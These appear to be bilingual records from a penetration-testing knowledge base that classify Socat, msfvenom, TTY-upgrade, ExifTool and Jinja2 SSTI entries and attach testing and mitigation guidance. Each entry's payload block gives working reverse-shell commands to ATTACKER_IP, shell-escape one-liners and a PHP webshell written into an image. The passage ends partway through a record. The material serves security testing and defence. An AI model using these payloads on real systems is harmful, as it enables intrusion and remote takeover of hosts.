overview.en: Socat Reverse Connection and PTY Commands is tool command or reference data rather than an independent payload. It maintains differences among Socat address types, EXEC options, PTY flags, and listener versus connector roles. Its prerequisites are Socat is installed on the relevant hosts, the port is authorized, command execution already exists, and PTY plus terminal-signal behavior is in scope. Migration quality requires Socat diagnostics, address roles, child process tree, TTY state, and controlled connection match the selected line; a runnable tool command or wordlist hit is not automatically a target finding.

vulnerability.zh: 该条目本身不建立漏洞。真实风险取决于两端安装 Socat、选定端口获准、目标已具备命令执行且 PTY 与终端信号行为在测试范围，随后才可能用这些命令或特征审查“Socat 地址类型、EXEC 选项、PTY 标志与监听端和连接端角色之间的区别”。必须把前置执行入口、目标环境和工具结果分开记录，避免把后渗透能力倒置成初始攻击链。
vulnerability.en: The entry does not establish a vulnerability. Risk depends on Socat is installed on the relevant hosts, the port is authorized, command execution already exists, and PTY plus terminal-signal behavior is in scope, after which the commands or signatures may examine differences among Socat address types, EXEC options, PTY flags, and listener versus connector roles. Keep the prerequisite execution entry, target environment, and tool result separate so post-exploitation capability is not inverted into an initial chain.

exploitation.zh: 先以 -d -d 在隔离网络逐行确认监听与连接角色，再用固定 echo 测试 EXEC 和 PTY，不在真实交互会话中验证信号处理。迁移时逐行保留字节、来源、平台或版本标签与副作用说明，执行验证仅限一次性环境和固定无害标记；不支持、失效或仅用于识别的行必须显式标注。
exploitation.en: use -d -d in an isolated network to confirm listener and connector roles line by line, then test EXEC and PTY with fixed echo markers rather than a live interactive session. Preserve bytes, provenance, platform or version tags, and side effects line by line; execute only in disposable environments with fixed harmless markers, and explicitly label unsupported, invalid, or signature-only lines.

mitigation.zh: 迁入 web-shells 并按监听、连接与 PTY 标签整理；生产限制 Socat 二进制、子进程和非业务出口。工具卡回归需要确认目标入口可达、原命令可复制、精确重复被合并、失效项仍可追溯，并且 Payload 导航不再重复展示纯命令或字典。
mitigation.en: move to web-shells with listener, connector, and PTY tags, and restrict Socat binaries, child processes, and non-business egress in production. Tool-card regression must prove the destination is reachable, original commands remain copyable, exact duplicates are merged, invalid items remain traceable, and payload navigation no longer duplicates commands or dictionaries.

title.zh: 核对“Socat 反连与 PTY 命令”来源与角色
title.en: Verify Socat Reverse Connection and PTY Commands provenance and role

description.zh: 确认该记录是命令或字典而非漏洞数据流，记录来源、平台、版本和前提“两端安装 Socat、选定端口获准、目标已具备命令执行且 PTY 与终端信号行为在测试范围”。

title.zh: 逐行标注“Socat Shell 与 PTY”适用性
title.en: Tag Socat Shells and PTYs applicability line by line

description.zh: 按实现、运行时、传输或识别用途分类，记录失效语法、副作用与证据要求“Socat 调试输出、地址角色、子进程树、TTY 状态和受控连接均与所选行一致”。
description.en: Classify by implementation, runtime, transport, or signature use and record invalid syntax, side effects, and evidence requirements: Socat diagnostics, address roles, child process tree, TTY state, and controlled connection match the selected line.

title.zh: 迁移“Socat 反连与 PTY 命令”原始命令
title.en: Migrate original Socat Reverse Connection and PTY Commands commands

description.zh: 测试步骤为：先以 -d -d 在隔离网络逐行确认监听与连接角色，再用固定 echo 测试 EXEC 和 PTY，不在真实交互会话中验证信号处理。完整保留原命令并只在一次性环境用固定标记验证。
description.en: use -d -d in an isolated network to confirm listener and connector roles line by line, then test EXEC and PTY with fixed echo markers rather than a live interactive session. Preserve the original command in full and validate only with fixed markers in a disposable environment.

attackChain.payload:
socat TCP:ATTACKER_IP:PORT EXEC:sh
socat TCP:ATTACKER_IP:PORT EXEC:'bash -li',pty,stderr,setsid,sigint,sane
socat file:`tty`,raw,echo=0 tcp-listen:PORT
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:ATTACKER_IP:PORT

name.zh: Msfvenom Web 与可执行文件生成命令
name.en: Msfvenom Web and Executable Payload Generation Commands

description.zh: 使用 msfvenom 生成 WAR、JAR、JSP、PHP、ASPX、EXE 与 ELF 输出，完全属于 Metasploit 工具命令，不应作为单一 WebShell Payload。
description.en: Uses msfvenom to generate WAR, JAR, JSP, PHP, ASPX, EXE, and ELF outputs; these are Metasploit tool commands rather than one webshell payload.

overview.zh: Msfvenom Web 与可执行文件生成命令是工具命令或参考字典，不是独立 Payload。维护目标为不同 Metasploit payload 模块、架构与输出格式如何映射到部署容器和目标操作系统。其适用前提为：测试者在隔离环境运行与数据库版本匹配的 msfvenom，LHOST/LPORT 属于自有测试地址，且生成文件不会进入真实业务系统。迁移质量以msfvenom 版本、模块信息、生成命令、文件格式与哈希全部保存，并明确其只是工具产物而非漏洞证据为准，不能把工具命令可运行或字典命中自动报告为目标漏洞。
overview.en: Msfvenom Web and Executable Payload Generation Commands is tool command or reference data rather than an independent payload. It maintains how Metasploit payload modules, architectures, and output formats map to deployment containers and target operating systems. Its prerequisites are the tester runs a database-compatible msfvenom in isolation, LHOST and LPORT are controlled test values, and generated files never reach a live business system. Migration quality requires msfvenom version, module information, generation command, file format, and hash are preserved while clearly separated from vulnerability evidence; a runnable tool command or wordlist hit is not automatically a target finding.

vulnerability.zh: 该条目本身不建立漏洞。真实风险取决于测试者在隔离环境运行与数据库版本匹配的 msfvenom，LHOST/LPORT 属于自有测试地址，且生成文件不会进入真实业务系统，随后才可能用这些命令或特征审查“不同 Metasploit payload 模块、架构与输出格式如何映射到部署容器和目标操作系统”。必须把前置执行入口、目标环境和工具结果分开记录，避免把后渗透能力倒置成初始攻击链。
vulnerability.en: The entry does not establish a vulnerability. Risk depends on the tester runs a database-compatible msfvenom in isolation, LHOST and LPORT are controlled test values, and generated files never reach a live business system, after which the commands or signatures may examine how Metasploit payload modules, architectures, and output formats map to deployment containers and target operating systems. Keep the prerequisite execution entry, target environment, and tool result separate so post-exploitation capability is not inverted into an initial chain.

exploitation.zh: 逐行使用 --list-options 或模块信息核对名称和架构，只在一次性目录生成文件并用 file/哈希验证格式，不部署或执行产物。迁移时逐行保留字节、来源、平台或版本标签与副作用说明，执行验证仅限一次性环境和固定无害标记；不支持、失效或仅用于识别的行必须显式标注。
exploitation.en: verify each module name and architecture with list-options or module information, generate only in a disposable directory, and inspect format plus hash without deploying or executing artifacts. Preserve bytes, provenance, platform or version tags, and side effects line by line; execute only in disposable environments with fixed harmless markers, and explicitly label unsupported, invalid, or signature-only lines.

mitigation.zh: 迁入 metasploit-advanced 并按 Java、PHP、Windows 与 Linux 输出分组；删除过时模块时保留迁移说明和原命令出处。工具卡回归需要确认目标入口可达、原命令可复制、精确重复被合并、失效项仍可追溯，并且 Payload 导航不再重复展示纯命令或字典。
mitigation.en: move to metasploit-advanced grouped by Java, PHP, Windows, and Linux outputs, retaining migration notes and provenance when obsolete modules are removed. Tool-card regression must prove the destination is reachable, original commands remain copyable, exact duplicates are merged, invalid items remain traceable, and payload navigation no longer duplicates commands or dictionaries.

title.zh: 核对“Msfvenom Web 与可执行文件生成命令”来源与角色
title.en: Verify Msfvenom Web and Executable Payload Generation Commands provenance and role

description.zh: 确认该记录是命令或字典而非漏洞数据流，记录来源、平台、版本和前提“测试者在隔离环境运行与数据库版本匹配的 msfvenom，LHOST/LPORT 属于自有测试地址，且生成文件不会进入真实业务系统”。
description.en: Confirm the record is command or dictionary data rather than a vulnerability flow, recording provenance, platform, version, and prerequisites: the tester runs a database-compatible msfvenom in isolation, LHOST and LPORT are controlled test values, and generated files never reach a live business system.

title.zh: 逐行标注“Msfvenom Payload 生成”适用性
title.en: Tag Msfvenom Payload Generation applicability line by line

description.zh: 按实现、运行时、传输或识别用途分类，记录失效语法、副作用与证据要求“msfvenom 版本、模块信息、生成命令、文件格式与哈希全部保存，并明确其只是工具产物而非漏洞证据”。
description.en: Classify by implementation, runtime, transport, or signature use and record invalid syntax, side effects, and evidence requirements: msfvenom version, module information, generation command, file format, and hash are preserved while clearly separated from vulnerability evidence.

title.zh: 迁移“Msfvenom Web 与可执行文件生成命令”原始命令
title.en: Migrate original Msfvenom Web and Executable Payload Generation Commands commands

description.zh: 测试步骤为：逐行使用 --list-options 或模块信息核对名称和架构，只在一次性目录生成文件并用 file/哈希验证格式，不部署或执行产物。完整保留原命令并只在一次性环境用固定标记验证。
description.en: verify each module name and architecture with list-options or module information, generate only in a disposable directory, and inspect format plus hash without deploying or executing artifacts. Preserve the original command in full and validate only with fixed markers in a disposable environment.

attackChain.payload:
msfvenom -p java/jsp_shell_reverse_tcp LHOST=ATTACKER_IP LPORT=PORT -f war > reverse.war
msfvenom -p java/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=PORT -f jar > reverse.jar
msfvenom -p java/jsp_shell_reverse_tcp LHOST=ATTACKER_IP LPORT=PORT -f raw > reverse.jsp
msfvenom -p php/meterpreter_reverse_tcp LHOST=ATTACKER_IP LPORT=PORT -f raw > reverse.php
msfvenom -p php/reverse_php LHOST=ATTACKER_IP LPORT=PORT -f raw > reverse.php
msfvenom -p windows/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=PORT -f aspx -o reverse.aspx
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=PORT -f aspx -o reverse.aspx
msfvenom -p windows/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=PORT -f exe > reverse.exe
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=PORT -f exe > reverse.exe
msfvenom -p linux/x86/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=PORT -f elf > reverse.elf
msfvenom -p linux/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=PORT -f elf > reverse.elf

title.zh: 建立目标 Tool 回归
title.en: Regress the destination tool

description.zh: 实施“迁入 metasploit-advanced 并按 Java、PHP、Windows 与 Linux 输出分组；删除过时模块时保留迁移说明和原命令出处”，确认工具入口、复制、去重、版本标签与导航均正确，且 Payload 树不再重复。
description.en: Apply move to metasploit-advanced grouped by Java, PHP, Windows, and Linux outputs, retaining migration notes and provenance when obsolete modules are removed and verify tool access, copying, deduplication, version tags, and navigation without payload-tree duplication.

review.rationale: Msfvenom Web 与可执行文件生成命令是纯工具命令或参考字典，应迁入 metasploit-advanced，保留原始字节、来源和适用前提。

prerequisites.zh: 已确认“Msfvenom Web 与可执行文件生成命令”是纯命令/字典，目标 Tool metasploit-advanced 均存在，并记录来源、版本及前提：测试者在隔离环境运行与数据库版本匹配的 msfvenom，LHOST/LPORT 属于自有测试地址，且生成文件不会进入真实业务系统。
prerequisites.en: The Msfvenom Web and Executable Payload Generation Commands record is command or dictionary data, destination tools metasploit-advanced exist, and provenance, version, and prerequisites are recorded: the tester runs a database-compatible msfvenom in isolation, LHOST and LPORT are controlled test values, and generated files never reach a live business system.

prerequisites.zh: 可在一次性主机或离线解析器逐行验证，并用msfvenom 版本、模块信息、生成命令、文件格式与哈希全部保存，并明确其只是工具产物而非漏洞证据检查迁移完整性。
prerequisites.en: Every line can be checked in a disposable host or offline parser, using msfvenom version, module information, generation command, file format, and hash are preserved while clearly separated from vulnerability evidence for migration completeness.

analysis.zh: 本条阳性是命令/字典被准确迁移，原字节、来源和msfvenom 版本、模块信息、生成命令、文件格式与哈希全部保存，并明确其只是工具产物而非漏洞证据保留；它不确认目标漏洞。命令可运行、已有 Shell 回连、字典命中或签名相似均不能证明“不同 Metasploit payload 模块、架构与输出格式如何映射到部署容器和目标操作系统”对应的初始漏洞。
analysis.en: A positive means accurate migration with original bytes, provenance, and msfvenom version, module information, generation command, file format, and hash are preserved while clearly separated from vulnerability evidence; it does not confirm a target vulnerability. Runnable commands, callbacks from an existing shell, wordlist hits, or signature similarity do not prove an initial vulnerability related to how Metasploit payload modules, architectures, and output formats map to deployment containers and target operating systems.

opsecTips.zh: Msfvenom Web 与可执行文件生成命令停止条件：默认离线解析；执行时只用一次性自有地址和固定标记。指向公共地址、生成真实载荷、打开交互 Shell 或触碰非测试文件时立即停止。 本条重点观察“不同 Metasploit payload 模块、架构与输出格式如何映射到部署容器和目标操作系统”。
opsecTips.en: Msfvenom Web and Executable Payload Generation Commands stop condition: Prefer offline parsing; use disposable owned destinations and fixed markers if execution is needed. Stop on public destinations, real payload generation, interactive shells, or non-test files. The entry-specific focus is how Metasploit payload modules, architectures, and output formats map to deployment containers and target operating systems.

opsecTips.zh: Msfvenom Web 与可执行文件生成命令清理条件：迁移后关闭监听器，删除 FIFO、生成文件、下载脚本和测试字典副本，销毁环境并核对目标 Tool 无重复或未标记失效行。 清理完成后再次确认该技术路径没有残留可触发状态。
opsecTips.en: Msfvenom Web and Executable Payload Generation Commands cleanup condition: Close listeners, remove FIFOs, generated files, downloads, and wordlist copies, destroy the environment, and verify destination tools have no duplicates or untagged invalid lines. Recheck that no triggerable state remains for this technique.

name.zh: TTY 升级与本地 Shell 启动命令
name.en: TTY Upgrade and Local Shell Launch Commands

description.zh: 混合 Python pty、解释器、编辑器、分页器、归档器与环境命令的本地 Shell 启动技巧，属于后渗透命令手册而非 WebShell Payload。
description.en: Mixes Python pty, interpreters, editors, pagers, archivers, and environment commands for local shell startup; it is a post-exploitation command manual rather than a webshell payload.

subCategory.zh: TTY 与本地 Shell 升级

overview.zh: TTY 升级与本地 Shell 启动命令是工具命令或参考字典，不是独立 Payload。维护目标为哪些行用于生成 PTY、哪些依赖交互程序转义或 GTFOBins 行为，以及各自的前置二进制与权限。其适用前提为：已经存在授权的低交互 Shell，目标具备对应二进制，且本地提权或交互转义测试得到单独批准。迁移质量以每行命令对应的二进制版本、TTY 状态、有效 UID、子进程树和退出清理均被记录为准，不能把工具命令可运行或字典命中自动报告为目标漏洞。
overview.en: TTY Upgrade and Local Shell Launch Commands is tool command or reference data rather than an independent payload. It maintains which lines create a PTY, which rely on interactive-program escapes or GTFOBins behavior, and the required binaries and privileges. Its prerequisites are an authorized low-interaction shell already exists, the target provides the relevant binary, and local privilege or interactive escape testing has separate approval. Migration quality requires binary version, TTY state, effective UID, child process tree, and exit cleanup are recorded for every command; a runnable tool command or wordlist hit is not automatically a target finding.

vulnerability.zh: 该条目本身不建立漏洞。真实风险取决于已经存在授权的低交互 Shell，目标具备对应二进制，且本地提权或交互转义测试得到单独批准，随后才可能用这些命令或特征审查“哪些行用于生成 PTY、哪些依赖交互程序转义或 GTFOBins 行为，以及各自的前置二进制与权限”。必须把前置执行入口、目标环境和工具结果分开记录，避免把后渗透能力倒置成初始攻击链。
vulnerability.en: The entry does not establish a vulnerability. Risk depends on an authorized low-interaction shell already exists, the target provides the relevant binary, and local privilege or interactive escape testing has separate approval, after which the commands or signatures may examine which lines create a PTY, which rely on interactive-program escapes or GTFOBins behavior, and the required binaries and privileges. Keep the prerequisite execution entry, target environment, and tool result separate so post-exploitation capability is not inverted into an initial chain.

exploitation.zh: 按 pty、解释器、编辑器、分页器和归档器五类在容器中逐行验证，只使用当前用户固定 echo，不读取敏感文件或改变权限。迁移时逐行保留字节、来源、平台或版本标签与副作用说明，执行验证仅限一次性环境和固定无害标记；不支持、失效或仅用于识别的行必须显式标注。
exploitation.en: validate line by line in a container across pty, interpreter, editor, pager, and archiver groups using fixed echo under the current user without reading sensitive files or changing privileges. Preserve bytes, provenance, platform or version tags, and side effects line by line; execute only in disposable environments with fixed harmless markers, and explicitly label unsupported, invalid, or signature-only lines.

mitigation.zh: 迁入 linux-command-tricks 并为每行标注二进制、交互要求和副作用；生产环境最小化工具集并监控服务进程启动终端或交互 Shell。工具卡回归需要确认目标入口可达、原命令可复制、精确重复被合并、失效项仍可追溯，并且 Payload 导航不再重复展示纯命令或字典。
mitigation.en: move to linux-command-tricks with binary, interaction, and side-effect tags, and minimize production tooling while monitoring services that spawn terminals or interactive shells. Tool-card regression must prove the destination is reachable, original commands remain copyable, exact duplicates are merged, invalid items remain traceable, and payload navigation no longer duplicates commands or dictionaries.

title.zh: 核对“TTY 升级与本地 Shell 启动命令”来源与角色
title.en: Verify TTY Upgrade and Local Shell Launch Commands provenance and role

description.zh: 确认该记录是命令或字典而非漏洞数据流，记录来源、平台、版本和前提“已经存在授权的低交互 Shell，目标具备对应二进制，且本地提权或交互转义测试得到单独批准”。
description.en: Confirm the record is command or dictionary data rather than a vulnerability flow, recording provenance, platform, version, and prerequisites: an authorized low-interaction shell already exists, the target provides the relevant binary, and local privilege or interactive escape testing has separate approval.

title.zh: 逐行标注“TTY 与本地 Shell 升级”适用性
title.en: Tag TTY and Local Shell Upgrade applicability line by line

description.zh: 按实现、运行时、传输或识别用途分类，记录失效语法、副作用与证据要求“每行命令对应的二进制版本、TTY 状态、有效 UID、子进程树和退出清理均被记录”。
description.en: Classify by implementation, runtime, transport, or signature use and record invalid syntax, side effects, and evidence requirements: binary version, TTY state, effective UID, child process tree, and exit cleanup are recorded for every command.

title.zh: 迁移“TTY 升级与本地 Shell 启动命令”原始命令
title.en: Migrate original TTY Upgrade and Local Shell Launch Commands commands

description.zh: 测试步骤为：按 pty、解释器、编辑器、分页器和归档器五类在容器中逐行验证，只使用当前用户固定 echo，不读取敏感文件或改变权限。完整保留原命令并只在一次性环境用固定标记验证。
description.en: validate line by line in a container across pty, interpreter, editor, pager, and archiver groups using fixed echo under the current user without reading sensitive files or changing privileges. Preserve the original command in full and validate only with fixed markers in a disposable environment.

attackChain.payload:
python -c 'import pty;pty.spawn("/bin/bash")'
python3 -c 'import pty;pty.spawn("/bin/bash")'
python -c 'import pty;pty.spawn("/bin/sh")'
python3 -c 'import pty;pty.spawn("/bin/sh")'
echo os.system('/bin/bash')
/bin/sh -i
perl -e 'exec "/bin/sh";'
lua: os.execute('/bin/sh')
exec "/bin/sh"
awk 'BEGIN {system("/bin/sh")}'
find / -exec /bin/sh -p \; -quit
vim -c ':!sh'
vi -c ':!sh'
nmap --interactive
!sh
less /etc/passwd
!/bin/sh
man man
ftp
zip /tmp/test.zip /tmp/test -T --unzip-command="sh -c /bin/bash"
tar cf /dev/null testfile --checkpoint=1 --checkpoint-action=exec=/bin/bash
env /bin/sh
env -i /bin/sh

name.zh: ExifTool 图片元数据写入命令

description.zh: 通过 ExifTool 将 PHP 片段写入 PNG Comment 并改名的文件构造流程，属于上传测试工具命令；是否执行取决于服务器映射而不是元数据写入本身。
description.en: Uses ExifTool to write PHP snippets into PNG comments and rename the file; it is an upload-testing tool workflow whose execution depends on server mapping, not metadata writing alone.

overview.zh: ExifTool 图片元数据写入命令是工具命令或参考字典，不是独立 Payload。维护目标为ExifTool 元数据写入、双扩展改名与 Web 服务器内容类型和处理器映射之间的区别。其适用前提为：只在隔离上传实例使用无害 PHP 固定标记，上传目录与处理器配置可观察，且样本不会被部署到生产系统。迁移质量以写入前后文件哈希、ExifTool 标签输出、最终存储名、Content-Type 与服务器处理器日志能够关联为准，不能把工具命令可运行或字典命中自动报告为目标漏洞。
overview.en: ExifTool Image Metadata Injection Commands is tool command or reference data rather than an independent payload. It maintains the distinction between ExifTool metadata writing, double-extension renaming, and web-server content-type or handler mapping. Its prerequisites are only a harmless fixed PHP marker is used in an isolated upload instance, storage and handler configuration are observable, and the sample never reaches production. Migration quality requires pre- and post-write hashes, ExifTool tag output, final stored name, Content-Type, and server handler logs correlate; a runnable tool command or wordlist hit is not automatically a target finding.

vulnerability.zh: 该条目本身不建立漏洞。真实风险取决于只在隔离上传实例使用无害 PHP 固定标记，上传目录与处理器配置可观察，且样本不会被部署到生产系统，随后才可能用这些命令或特征审查“ExifTool 元数据写入、双扩展改名与 Web 服务器内容类型和处理器映射之间的区别”。必须把前置执行入口、目标环境和工具结果分开记录，避免把后渗透能力倒置成初始攻击链。
vulnerability.en: The entry does not establish a vulnerability. Risk depends on only a harmless fixed PHP marker is used in an isolated upload instance, storage and handler configuration are observable, and the sample never reaches production, after which the commands or signatures may examine the distinction between ExifTool metadata writing, double-extension renaming, and web-server content-type or handler mapping. Keep the prerequisite execution entry, target environment, and tool result separate so post-exploitation capability is not inverted into an initial chain.

exploitation.zh: 将原系统命令替换为固定文本标记，逐步执行 Comment 写入和改名，分别验证静态下载、图像解码和处理器选择，不发起反连。迁移时逐行保留字节、来源、平台或版本标签与副作用说明，执行验证仅限一次性环境和固定无害标记；不支持、失效或仅用于识别的行必须显式标注。
exploitation.en: replace original commands with a fixed text marker, perform comment writing and renaming separately, and test static download, image decoding, and handler selection without a reverse connection. Preserve bytes, provenance, platform or version tags, and side effects line by line; execute only in disposable environments with fixed harmless markers, and explicitly label unsupported, invalid, or signature-only lines.

mitigation.zh: 迁入 file-upload-attacks，上传侧使用服务端随机文件名、内容签名校验和不可执行对象存储，且不依赖双扩展黑名单。工具卡回归需要确认目标入口可达、原命令可复制、精确重复被合并、失效项仍可追溯，并且 Payload 导航不再重复展示纯命令或字典。
mitigation.en: move to file-upload-attacks, and use server-generated names, content-signature validation, and non-executable object storage instead of double-extension blacklists. Tool-card regression must prove the destination is reachable, original commands remain copyable, exact duplicates are merged, invalid items remain traceable, and payload navigation no longer duplicates commands or dictionaries.

title.zh: 核对“ExifTool 图片元数据写入命令”来源与角色
title.en: Verify ExifTool Image Metadata Injection Commands provenance and role

description.zh: 确认该记录是命令或字典而非漏洞数据流，记录来源、平台、版本和前提“只在隔离上传实例使用无害 PHP 固定标记，上传目录与处理器配置可观察，且样本不会被部署到生产系统”。

title.zh: 逐行标注“ExifTool 上传样本构造”适用性
title.en: Tag ExifTool Upload Sample Construction applicability line by line

description.zh: 按实现、运行时、传输或识别用途分类，记录失效语法、副作用与证据要求“写入前后文件哈希、ExifTool 标签输出、最终存储名、Content-Type 与服务器处理器日志能够关联”。
description.en: Classify by implementation, runtime, transport, or signature use and record invalid syntax, side effects, and evidence requirements: pre- and post-write hashes, ExifTool tag output, final stored name, Content-Type, and server handler logs correlate.

title.zh: 迁移“ExifTool 图片元数据写入命令”原始命令
title.en: Migrate original ExifTool Image Metadata Injection Commands commands

description.zh: 测试步骤为：将原系统命令替换为固定文本标记，逐步执行 Comment 写入和改名，分别验证静态下载、图像解码和处理器选择，不发起反连。完整保留原命令并只在一次性环境用固定标记验证。
description.en: replace original commands with a fixed text marker, perform comment writing and renaming separately, and test static download, image decoding, and handler selection without a reverse connection. Preserve the original command in full and validate only with fixed markers in a disposable environment.

attackChain.payload:
exiftool -Comment='<?php system($_GET["cmd"]); ?>' filename.png
mv filename.png filename.php.png
exiftool -Comment='<?php system("nc -e /bin/bash ATTACKER_IP PORT"); ?>' filename.png

title.zh: 建立目标 Tool 回归
title.en: Regress the destination tool

description.zh: 实施“迁入 file-upload-attacks，上传侧使用服务端随机文件名、内容签名校验和不可执行对象存储，且不依赖双扩展黑名单”，确认工具入口、复制、去重、版本标签与导航均正确，且 Payload 树不再重复。
description.en: Apply move to file-upload-attacks, and use server-generated names, content-signature validation, and non-executable object storage instead of double-extension blacklists and verify tool access, copying, deduplication, version tags, and navigation without payload-tree duplication.

review.rationale: ExifTool 图片元数据写入命令是纯工具命令或参考字典，应迁入 file-upload-attacks，保留原始字节、来源和适用前提。

prerequisites.zh: 已确认“ExifTool 图片元数据写入命令”是纯命令/字典，目标 Tool file-upload-attacks 均存在，并记录来源、版本及前提：只在隔离上传实例使用无害 PHP 固定标记，上传目录与处理器配置可观察，且样本不会被部署到生产系统。
prerequisites.en: The ExifTool Image Metadata Injection Commands record is command or dictionary data, destination tools file-upload-attacks exist, and provenance, version, and prerequisites are recorded: only a harmless fixed PHP marker is used in an isolated upload instance, storage and handler configuration are observable, and the sample never reaches production.

prerequisites.zh: 可在一次性主机或离线解析器逐行验证，并用写入前后文件哈希、ExifTool 标签输出、最终存储名、Content-Type 与服务器处理器日志能够关联检查迁移完整性。
prerequisites.en: Every line can be checked in a disposable host or offline parser, using pre- and post-write hashes, ExifTool tag output, final stored name, Content-Type, and server handler logs correlate for migration completeness.

analysis.zh: 本条阳性是命令/字典被准确迁移，原字节、来源和写入前后文件哈希、ExifTool 标签输出、最终存储名、Content-Type 与服务器处理器日志能够关联保留；它不确认目标漏洞。命令可运行、已有 Shell 回连、字典命中或签名相似均不能证明“ExifTool 元数据写入、双扩展改名与 Web 服务器内容类型和处理器映射之间的区别”对应的初始漏洞。
analysis.en: A positive means accurate migration with original bytes, provenance, and pre- and post-write hashes, ExifTool tag output, final stored name, Content-Type, and server handler logs correlate; it does not confirm a target vulnerability. Runnable commands, callbacks from an existing shell, wordlist hits, or signature similarity do not prove an initial vulnerability related to the distinction between ExifTool metadata writing, double-extension renaming, and web-server content-type or handler mapping.

opsecTips.zh: ExifTool 图片元数据写入命令停止条件：默认离线解析；执行时只用一次性自有地址和固定标记。指向公共地址、生成真实载荷、打开交互 Shell 或触碰非测试文件时立即停止。 本条重点观察“ExifTool 元数据写入、双扩展改名与 Web 服务器内容类型和处理器映射之间的区别”。
opsecTips.en: ExifTool Image Metadata Injection Commands stop condition: Prefer offline parsing; use disposable owned destinations and fixed markers if execution is needed. Stop on public destinations, real payload generation, interactive shells, or non-test files. The entry-specific focus is the distinction between ExifTool metadata writing, double-extension renaming, and web-server content-type or handler mapping.

opsecTips.zh: ExifTool 图片元数据写入命令清理条件：迁移后关闭监听器，删除 FIFO、生成文件、下载脚本和测试字典副本，销毁环境并核对目标 Tool 无重复或未标记失效行。 清理完成后再次确认该技术路径没有残留可触发状态。
opsecTips.en: ExifTool Image Metadata Injection Commands cleanup condition: Close listeners, remove FIFOs, generated files, downloads, and wordlist copies, destroy the environment, and verify destination tools have no duplicates or untagged invalid lines. Recheck that no triggerable state remains for this technique.

name.zh: Jinja2 SSTI 进程执行链

description.zh: 覆盖 Flask globals、Python 子类枚举和 builtins 导入的 Jinja2 表达式，用于确认模板注入是否跨越沙箱并到达进程执行。
description.en: Covers Flask globals, Python subclass enumeration, and builtins imports in Jinja2 expressions to test whether template injection escapes sandboxing and reaches process execution.

subCategory.zh: Jinja2 对象图到进程执行
subCategory.en: Jinja2 Object Graph to Process Execution

overview.zh: Jinja2 SSTI 进程执行链验证模板上下文是否暴露 request、应用 globals、Python 类型对象或 builtins，并允许解析链调用 os 或 subprocess。它要求不可信字符串由 Jinja2 当作模板源码编译，沙箱未启用或对象属性策略可绕过，进程账户允许创建子进程。成功证据为模板表达式解析路径、渲染日志、子进程固定标记与同一请求 ID 完整关联；算术表达式成立只能证明模板求值，外连命令文本出现也不能证明已经越过对象与进程边界。
overview.en: Jinja2 SSTI Process Execution Chains tests whether template context exposes request, application globals, Python type objects, or builtins and permits a resolution chain to os or subprocess. It requires an untrusted string is compiled as Jinja2 template source, sandboxing is absent or attribute policy is bypassable, and the process identity can create child processes. Success requires the template resolution path, render log, fixed child-process marker, and request identifier fully correlate; arithmetic proves template evaluation only, and reflected reverse-command text does not prove process execution.

vulnerability.zh: 根因是不可信字符串由 Jinja2 当作模板源码编译，沙箱未启用或对象属性策略可绕过，进程账户允许创建子进程，Jinja2 对象解析因此可能到达“模板上下文是否暴露 request、应用 globals、Python 类型对象或 builtins，并允许解析链调用 os 或 subprocess”。影响取决于模板来源、沙箱属性策略、可见 globals、Python 版本与 worker 权限，需要分阶段证明表达式、对象访问和进程调用。
vulnerability.en: The root cause is an untrusted string is compiled as Jinja2 template source, sandboxing is absent or attribute policy is bypassable, and the process identity can create child processes, allowing Jinja2 resolution toward whether template context exposes request, application globals, Python type objects, or builtins and permits a resolution chain to os or subprocess. Impact depends on template provenance, sandbox attribute policy, exposed globals, Python version, and worker privilege, so expression, object access, and process invocation require separate proof.

exploitation.zh: 先用算术与安全属性访问建立 SSTI 基线，再将反连命令替换为固定 stdout 标记，逐条确认 globals、subclasses 和 builtins 三类对象链。每次只验证一条对象链，将所有反连动作改为固定 stdout 标记，记录模板源码、渲染结果、属性访问拒绝和子进程日志，并在取得最小证据后停止。
exploitation.en: establish SSTI with arithmetic and safe attribute access, replace reverse commands with a fixed stdout marker, and test globals, subclasses, and builtins object chains separately. Validate one object chain per run, replace all reverse behavior with fixed stdout markers, retain template source, render result, denied attributes, and child logs, and stop after minimal proof.

mitigation.zh: 禁止将用户内容作为模板源码，使用固定模板和数据参数；启用并收紧沙箱属性策略，以低权限运行并阻止模板进程创建子进程。回归使用固定模板、合法数据、算术探针和原对象链，确认业务渲染保留，而不可信内容始终作为数据处理且无法访问 globals、类型对象或进程 API。
mitigation.en: never compile user content as template source, use fixed templates with data parameters, enforce strict sandbox attribute policy, run with least privilege, and prevent template workers from spawning processes. Regress fixed templates, valid data, arithmetic probes, and original object chains to preserve rendering while untrusted content remains data and cannot reach globals, type objects, or process APIs.

title.zh: 确认 Jinja2 模板源码可控
title.en: Confirm controllable Jinja2 source

description.zh: 使用算术和固定字符串区分模板源码注入与普通变量渲染，并核对“不可信字符串由 Jinja2 当作模板源码编译，沙箱未启用或对象属性策略可绕过，进程账户允许创建子进程”。
description.en: Use arithmetic and fixed strings to distinguish template-source injection from ordinary variable rendering and confirm that an untrusted string is compiled as Jinja2 template source, sandboxing is absent or attribute policy is bypassable, and the process identity can create child processes.

title.zh: 枚举允许的对象边界
title.en: Map the allowed object boundary

description.zh: 逐步检查 request、globals、类型属性与沙箱拒绝记录，采用“模板表达式解析路径、渲染日志、子进程固定标记与同一请求 ID 完整关联”作为跨入进程边界的证据。
description.en: Inspect request, globals, type attributes, and sandbox denials incrementally, using the template resolution path, render log, fixed child-process marker, and request identifier fully correlate as evidence of process-boundary crossing.

title.zh: 无害重放“Jinja2 SSTI 进程执行链”对象链
title.en: Replay the Jinja2 SSTI Process Execution Chains chain harmlessly

description.zh: 测试步骤为：先用算术与安全属性访问建立 SSTI 基线，再将反连命令替换为固定 stdout 标记，逐条确认 globals、subclasses 和 builtins 三类对象链。每条反连命令在运行前替换为固定 stdout 标记。
description.en: establish SSTI with arithmetic and safe attribute access, replace reverse commands with a fixed stdout marker, and test globals, subclasses, and builtins object chains separately. Replace every reverse command with a fixed stdout marker before runtime.

title.zh: 固定模板并隔离 worker
title.en: Fix templates and isolate workers

